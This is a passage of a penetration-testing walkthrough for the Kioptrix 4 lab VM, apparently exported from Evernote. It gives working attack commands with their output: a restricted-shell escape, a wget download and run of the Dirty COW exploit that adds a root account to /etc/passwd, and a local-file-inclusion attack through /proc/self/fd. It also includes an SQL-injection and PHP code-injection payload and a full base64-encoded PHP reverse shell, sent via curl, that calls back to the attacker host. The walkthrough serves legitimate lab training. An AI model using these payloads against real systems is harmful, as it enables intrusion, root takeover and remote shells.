        <div>root@kali:~/Walkthroughs/kioptrix4# gcc -m32 -o 40839 40839.c -lpthread -lcrypt</div>
    </div>
    <div><br /></div>
    <div>Running the exploit on the victim looks like this.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# ssh john@10.183.0.216</div>
        <div>john@10.183.0.216's password: </div>
        <div>Welcome to LigGoat Security Systems - We are Watching</div>
        <div>== Welcome LigGoat Employee ==</div>
        <div>LigGoat Shell is in place so you  don't screw up</div>
        <div>Type '?' or 'help' to get the list of allowed commands</div>
        <div>john:~$ echo os.system('/bin/bash')</div>
        <div>john@Kioptrix4:~$ cd /tmp</div>
        <div>john@Kioptrix4:/tmp$ wget -O 40839 10.183.0.222:432/40839</div>
        <div>--06:52:49--  http://10.183.0.222:432/40839</div>
        <div>           =&gt; `40839'</div>
        <div>Connecting to 10.183.0.222:432... connected.</div>
        <div>HTTP request sent, awaiting response... 200 OK</div>
        <div>Length: 16,696 (16K) [application/octet-stream]</div>
        <div>
            <div><br /></div>
        </div>
        <div>100%[==========================================================================================================&gt;] 16,696        --.--K/s             </div>
        <div>
            <div><br /></div>
        </div>
        <div>06:52:49 (15.26 MB/s) - `40839' saved [16696/16696]</div>
        <div>
            <div><br /></div>
        </div>
        <div>john@Kioptrix4:/tmp$ chmod +x 40839</div>
        <div>john@Kioptrix4:/tmp$ ./40839</div>
        <div>/etc/passwd successfully backed up to /tmp/passwd.bak</div>
        <div>Please enter the new password:</div>
        <div>Complete line:</div>
        <div>firefart:fiKBbJoc.sTuE:0:0:pwned:/root:/bin/bash</div>
        <div>
            <div><br /></div>
        </div>
        <div>mmap: b7f58000</div>
        <div>
            <div><br /></div>
        </div>
        <div>john@Kioptrix4:/tmp$ head /etc/passwd</div>
        <div>
            <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">firefart:fiKBbJoc.sTuE:0:0:pwned:/root:/bin/bash</font>
        </div>
        <div>[...snip...]</div>
        <div>john@Kioptrix4:/tmp$ su - firefart</div>
        <div>Password: </div>
        <div>firefart@Kioptrix4:~# id</div>
        <div>
            <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">uid=0(firefart) gid=0(root) groups=0(root)</font>
        </div>
        <div>firefart@Kioptrix4:~# mv /tmp/passwd.bak /etc/passwd</div>
        <div>firefart@Kioptrix4:~# head /etc/passwd</div>
        <div>
            <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">root:x:0:0:root:/root:/bin/bash</font>
        </div>
        <div>[...snip...]</div>
        <div>firefart@Kioptrix4:~# id</div>
        <div>
            <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">uid=0(root) gid=0(root) groups=0(root)</font>
        </div>
    </div>
    <div><br /></div>
    <div>Walking through what’s happening here, I...</div>
    <ul>
        <li>
            <div>logged in as john</div>
        </li>
        <li>
            <div>escaped the restricted shell</div>
        </li>
        <li>
            <div>moved to /tmp</div>
        </li>
        <li>
            <div>downloaded the exploit</div>
        </li>
        <li>
            <div>made the exploit executable</div>
        </li>
        <li>
            <div>ran the exploit (setting a password for the ‘firefart’ account)</div>
        </li>
        <li>
            <div>used Ctrl+C to stop the exploit</div>
        </li>
        <li>
            <div>checked to make sure my new ‘firefart’ account was in /etc/passwd</div>
        </li>
        <li>
            <div>verified I had uid/gid 0 (root)</div>
        </li>
        <li>
            <div>restored the original /etc/passwd file (backed up at /tmp/passwd.bak by the exploit)</div>
        </li>
        <li>
            <div>checked to make sure the root account was back at the top of /etc/passwd</div>
        </li>
        <li>
            <div>verified I still had uid/gid 0 (root)</div>
        </li>
    </ul>
    <div><br /></div>
    <div><br /></div>
    <div><b>Using LFI + /proc</b></div>
    <div><br /></div>
    <div>There are lots of ways to take advantage of Local File Inclusion (LFI) vulnerabilities. Some of the ways specific to PHP can be found here:</div>
    <div><a target="_blank" href="https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/">https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/</a></div>
    <div><br /></div>
    <div>One that is of interest in our case is the ability to access file descriptors under /proc/self/fd (self = the currently running process). These file descriptors are numbered starting at 0 and might contain useful information or allow us to execute remote code (by writing to the file descriptor and then loading its content using our LFI vulnerability).</div>
    <div><br /></div>
    <div>I used the following loop + curl command to check file descriptors between 0 and 255 for the currently running process (i.e., apache).</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4/lfi_test# for i in $(seq 0 255); do curl -so $i.html -b "PHPSESSID=537eff2e1387de1eaf0dbb44b91cde53" "http://10.183.0.216/member.php?username=/proc/self/fd/$i%00"; done</div>
    </div>
    <div><br /></div>
    <div>When we remove the responses that contain the “Oups” error...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4/lfi_test# grep -i Oups *.html | cut -d ':' -f 1 | sort -u | xargs rm</div>
    </div>
    <div><br /></div>
    <div>...and the “failed to open stream” error...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4/lfi_test# grep -i 'failed to open stream' * | cut -d ':' -f 1 | sort -u | xargs rm</div>
    </div>
    <div><br /></div>
    <div>...we are left with one file.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4/lfi_test# cat 9.html </div>
        <div>myusername|s:4:"john";mypassword|s:11:"%' or 1=1 #";</div>
    </div>
    <div><br /></div>
    <div>Looks like file descriptor 9 contains the variables and values submitted through the login form. Let’s see if we can submit PHP code in the ‘mypassword’ field and use file descriptor 9 to access it and have it run system commands for us.</div>
    <div><br /></div>
    <div>We’ll submit the following in the password field...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>%' or 1=1 # &lt;?php echo system(id); ?&gt;</div>
    </div>
    <div><br /></div>
    <div>Then, checking our file descriptor...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4/lfi_test# curl -b "PHPSESSID=537eff2e1387de1eaf0dbb44b91cde53" "http://10.183.0.216/member.php?username=/proc/self/fd/9%00"</div>
        <div>myusername|s:4:"john";mypassword|s:37:"%' or 1=1 # <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">uid=33(www-data) gid=33(www-data) groups=33(www-data)</font>
        </div>
        <div>
            <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">uid=33(www-data) gid=33(www-data) groups=33(www-data)</font>";
        </div>
    </div>
    <div><br /></div>
    <div>Nice! We have remote code execution through the LFI vulnerability. From here it would be pretty easy to launch a reverse shell...</div>
    <div><br /></div>
    <div>...by submitting the following...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>%' or 1=1 # &lt;?php eval(base64_decode(***PHP_REVERSE_SHELL_BASE64_FROM_MSFVENOM***)); ?&gt;</div>
    </div>
    <div><br /></div>
    <div>...URL encoded and sent via curl...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>curl -b "PHPSESSID=537eff2e1387de1eaf0dbb44b91cde53" -d "myusername=john&amp;mypassword=%25%27%20or%201%3D1%20%23%20%3C%3Fphp%20eval%28base64_decode%28ICAgIC8qPD9waHAgLyoqLwogICAgICBAZXJyb3JfcmVwb3J0aW5nKDApOwogICAgICBAc2V0X3RpbWVfbGltaXQoMCk7IEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7CiAgICAgICRkaXM9QGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CiAgICAgIGlmKCFlbXB0eSgkZGlzKSl7CiAgICAgICAgJGRpcz1wcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRkaXMpOwogICAgICAgICRkaXM9ZXhwbG9kZSgnLCcsICRkaXMpOwogICAgICAgICRkaXM9YXJyYXlfbWFwKCd0cmltJywgJGRpcyk7CiAgICAgIH1lbHNlewogICAgICAgICRkaXM9YXJyYXkoKTsKICAgICAgfQogICAgICAKICAgICRpcGFkZHI9JzEwLjE4My4wLjIyMic7CiAgICAkcG9ydD00NDQ7CgogICAgaWYoIWZ1bmN0aW9uX2V4aXN0cygncGFJSGF0UVdrdGx4am0nKSl7CiAgICAgIGZ1bmN0aW9uIHBhSUhhdFFXa3RseGptKCRjKXsKICAgICAgICBnbG9iYWwgJGRpczsKICAgICAgICAKICAgICAgaWYgKEZBTFNFICE9PSBzdHJwb3Moc3RydG9sb3dlcihQSFBfT1MpLCAnd2luJyApKSB7CiAgICAgICAgJGM9JGMuIiAyPiYxXG4iOwogICAgICB9CiAgICAgICRoTnhlPSdpc19jYWxsYWJsZSc7CiAgICAgICRtdURxbT0naW5fYXJyYXknOwogICAgICAKICAgICAgaWYo.JGhOeGUoJ3NoZWxsX2V4ZWMnKWFuZCEkbXVEcW0oJ3NoZWxsX2V4ZWMnLCRkaXMpKXsKICAgICAgICAkbz1zaGVsbF9leGVjKCRjKTsKICAgICAgfWVsc2UKICAgICAgaWYoJGhOeGUoJ2V4ZWMnKWFuZCEkbXVEcW0oJ2V4ZWMnLCRkaXMpKXsKICAgICAgICAkbz1hcnJheSgpOwogICAgICAgIGV4ZWMoJGMsJG8pOwogICAgICAgICRvPWpvaW4oY2hyKDEwKSwkbykuY2hyKDEwKTsKICAgICAgfWVsc2UKICAgICAgaWYoJGhOeGUoJ3Byb2Nfb3BlbicpYW5kISRtdURxbSgncHJvY19vcGVuJywkZGlzKSl7CiAgICAgICAgJGhhbmRsZT1wcm9jX29wZW4oJGMsYXJyYXkoYXJyYXkoJ3BpcGUnLCdyJyksYXJyYXkoJ3BpcGUnLCd3JyksYXJyYXkoJ3BpcGUnLCd3JykpLCRwaXBlcyk7CiAgICAgICAgJG89TlVMTDsKICAgICAgICB3aGlsZSghZmVvZigkcGlwZXNbMV0pKXsKICAgICAgICAgICRvLj1mcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAgICAgfQogICAgICAgIEBwcm9jX2Nsb3NlKCRoYW5kbGUpOwogICAgICB9ZWxzZQogICAgICBpZigkaE54ZSgnc3lzdGVtJylhbmQhJG11RHFtKCdzeXN0ZW0nLCRkaXMpKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHN5c3RlbSgkYyk7CiAgICAgICAgJG89b2JfZ2V0X2NvbnRlbnRzKCk7CiAgICAgICAgb2JfZW5kX2NsZWFuKCk7CiAgICA.gIH1lbHNlCiAgICAgIGlmKCRoTnhlKCdwYXNzdGhydScpYW5kISRtdURxbSgncGFzc3RocnUnLCRkaXMpKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHBhc3N0aHJ1KCRjKTsKICAgICAgICAkbz1vYl9nZXRfY29udGVudHMoKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgICAgfWVsc2UKICAgICAgaWYoJGhOeGUoJ3BvcGVuJylhbmQhJG11RHFtKCdwb3BlbicsJGRpcykpewogICAgICAgICRmcD1wb3BlbigkYywncicpOwogICAgICAgICRvPU5VTEw7CiAgICAgICAgaWYoaXNfcmVzb3VyY2UoJGZwKSl7CiAgICAgICAgICB3aGlsZSghZmVvZigkZnApKXsKICAgICAgICAgICAgJG8uPWZyZWFkKCRmcCwxMDI0KTsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgQHBjbG9zZSgkZnApOwogICAgICB9ZWxzZQogICAgICB7CiAgICAgICAgJG89MDsKICAgICAgfQogICAgCiAgICAgICAgcmV0dXJuICRvOwogICAgICB9CiAgICB9CiAgICAkbm9mdW5jcz0nbm8gZXhlYyBmdW5jdGlvbnMnOwogICAgaWYoaXNfY2FsbGFibGUoJ2Zzb2Nrb3BlbicpYW5kIWluX2FycmF5KCdmc29ja29wZW4nLCRkaXMpKXsKICAgICAgJHM9QGZzb2Nrb3BlbigidGNwOi8vMTAuMTgzLjAuMjIyIiwkcG9ydCk7CiAgICAgIHdoaWxlKCRjPWZyZWFkKCRzLDIwNDgpKXsKICAgICAgICAkb3V0ID0.gJyc7CiAgICAgICAgaWYoc3Vic3RyKCRjLDAsMykgPT0gJ2NkICcpewogICAgICAgICAgY2hkaXIoc3Vic3RyKCRjLDMsLTEpKTsKICAgICAgICB9IGVsc2UgaWYgKHN1YnN0cigkYywwLDQpID09ICdxdWl0JyB8fCBzdWJzdHIoJGMsMCw0KSA9PSAnZXhpdCcpIHsKICAgICAgICAgIGJyZWFrOwogICAgICAgIH1lbHNlewogICAgICAgICAgJG91dD1wYUlIYXRRV2t0bHhqbShzdWJzdHIoJGMsMCwtMSkpOwogICAgICAgICAgaWYoJG91dD09PWZhbHNlKXsKICAgICAgICAgICAgZndyaXRlKCRzLCRub2Z1bmNzKTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZ3cml0ZSgkcywkb3V0KTsKICAgICAgfQogICAgICBmY2xvc2UoJHMpOwogICAgfWVsc2V7CiAgICAgICRzPUBzb2NrZXRfY3JlYXRlKEFGX0lORVQsU09DS19TVFJFQU0sU09MX1RDUCk7CiAgICAgIEBzb2NrZXRfY29ubmVjdCgkcywkaXBhZGRyLCRwb3J0KTsKICAgICAgQHNvY2tldF93cml0ZSgkcywic29ja2V0X2NyZWF0ZSIpOwogICAgICB3aGlsZSgkYz1Ac29ja2V0X3JlYWQoJHMsMjA0OCkpewogICAgICAgICRvdXQgPSAnJzsKICAgICAgICBpZihzdWJzdHIoJGMsMCwzKSA9PSAnY2QgJyl7CiAgICAgICAgICBjaGRpcihzdWJzdHIoJGMsMywtMSkpOwogICAgICAgIH0gZWxzZS.BpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1aXQnIHx8IHN1YnN0cigkYywwLDQpID09ICdleGl0JykgewogICAgICAgICAgYnJlYWs7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAkb3V0PXBhSUhhdFFXa3RseGptKHN1YnN0cigkYywwLC0xKSk7CiAgICAgICAgICBpZigkb3V0PT09ZmFsc2UpewogICAgICAgICAgICBAc29ja2V0X3dyaXRlKCRzLCRub2Z1bmNzKTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIEBzb2NrZXRfd3JpdGUoJHMsJG91dCxzdHJsZW4oJG91dCkpOwogICAgICB9CiAgICAgIEBzb2NrZXRfY2xvc2UoJHMpOwogICAgfQo%29%29%3B%20%3F%3E&amp;Submit=Login" "http://10.183.0.216/checklogin.php"</div>
    </div>
    <div><br /></div>
    <div>Then running it by hitting the file descriptor.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# curl -b "PHPSESSID=537eff2e1387de1eaf0dbb44b91cde53" "http://10.183.0.216/member.php?username=/proc/self/fd/9%00"</div>
    </div>
    <div><br /></div>
    <div>Other interesting things we can get using proc include:</div>
    <div><br /></div>
    <div>The full command used to launch the process (/proc/self/cmdline)...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4/lfi_test# curl -s -b "PHPSESSID=537eff2e1387de1eaf0dbb44b91cde53" "http://10.183.0.216/member.php?username=/proc/self/cmdline%00" | xxd</div>
        <div>00000000: 2f75 7372 2f73 6269 6e2f 6170 6163 6865  /usr/sbin/apache</div>
        <div>00000010: 3200 2d6b 0073 7461 7274 000a            2.-k.start..</div>
    </div>
    <div><br /></div>
    <div>*** NOTE *** I’m piping the output to xxd for display purposes only (because curl doesn’t like to spew binary data to the terminal). You could dump the info to a file and look at it there too.</div>
    <div><br /></div>
    <div>The status of the process (/proc/self/status), including the actual PID and parent PID...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4/lfi_test# curl -s -b "PHPSESSID=537eff2e1387de1eaf0dbb44b91cde53" "http://10.183.0.216/member.php?username=/proc/self/status%00" &gt; status</div>
        <div>root@kali:~/Walkthroughs/kioptrix4/lfi_test# cat status </div>
        <div>Name:   apache2</div>
        <div>State:  R (running)</div>
        <div>Tgid:   4776</div>
        <div>Pid:    4776</div>
        <div>PPid:   4740</div>
        <div>TracerPid:      0</div>
        <div>Uid:    33      33      33      33</div>
        <div>Gid:    33      33      33      33</div>
        <div>FDSize: 32</div>
        <div>Groups: 33 </div>
        <div>VmPeak:    20596 kB</div>
        <div>VmSize:    20596 kB</div>
        <div>VmLck:         0 kB</div>
        <div>VmHWM:      5592 kB</div>
        <div>VmRSS:      5592 kB</div>
        <div>VmData:     3120 kB</div>
        <div>VmStk:        84 kB</div>
        <div>VmExe:       332 kB</div>
        <div>VmLib:     16080 kB</div>
        <div>VmPTE:        48 kB</div>
        <div>Threads:        1</div>
        <div>SigQ:   0/4096</div>
        <div>SigPnd: 0000000000000000</div>
        <div>ShdPnd: 0000000000000000</div>
        <div>SigBlk: 0000000000000000</div>
        <div>SigIgn: 0000000000001000</div>
        <div>SigCgt: 000000018c0046eb</div>
        <div>CapInh: 0000000000000000</div>
        <div>CapPrm: 0000000000000000</div>
        <div>CapEff: 0000000000000000</div>
        <div>Cpus_allowed:   01</div>
        <div>Mems_allowed:   1</div>
        <div>voluntary_ctxt_switches:        227</div>
        <div>nonvoluntary_ctxt_switches:     1</div>
    </div>
    <div><br /></div>
    <div>You could even mine out data about all the running processes (including config files and possible passwords passed on the command line) by looping through a range of PIDs.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4/lfi_test# for i in $(seq 4000 5000); do curl -o $i -s -b "PHPSESSID=537eff2e1387de1eaf0dbb44b91cde53" "http://10.183.0.216/member.php?username=/proc/$i/cmdline%00"; done</div>
    </div>
    <div><br /></div>
    <div><br /></div>